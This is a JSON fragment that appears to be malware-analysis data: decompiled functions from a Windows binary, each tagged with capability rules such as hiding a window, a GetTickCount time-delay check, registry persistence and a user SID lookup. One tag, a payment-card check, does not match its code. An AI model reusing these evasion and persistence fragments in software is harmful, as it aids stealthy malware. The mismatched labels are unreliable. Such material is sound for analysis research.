        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404b69) overlaps instruction at (ram,0x00404b60)\n// \n// WARNING: Removing unreachable block (ram,0x00404ade)\n// WARNING: Removing unreachable block (ram,0x00404b5a)\n\nuint __cdecl fcn.00404a80(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &Sid, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&Sid, arg_8h);\n        if (iVar1 != 0) {\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 324
    },
    "00404dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404dc0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x4224e8, 0x42252c, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 141
    },
    "00401030": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040105f) overlaps instruction at (ram,0x0040105c)\n// \n// WARNING: Removing unreachable block (ram,0x00401076)\n\nvoid __cdecl fcn.00401030(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (0 < arg_14h) {\n        do {\n            if ((unaff_EBX == -1) || (iVar1 = arg_14h,  unaff_EBX != -1)) {\n                iVar1 = iVar2;\n            }\n            *(iVar2 + arg_10h) = arg_14h ^ *(iVar2 + arg_10h) ^ *(iVar1 % arg_ch + arg_8h);\n            iVar2 = iVar2 + 1;\n            unaff_EBX = arg_10h;\n        } while (iVar2 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00402ed0": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402f28)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00402ed0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)();\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        return iVar1 == 0;\n    }\n    return false;\n}\n",
        "token_count": 181
    },
    "00404b80": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00404b80(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411230, 0x411274, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 78
    }
}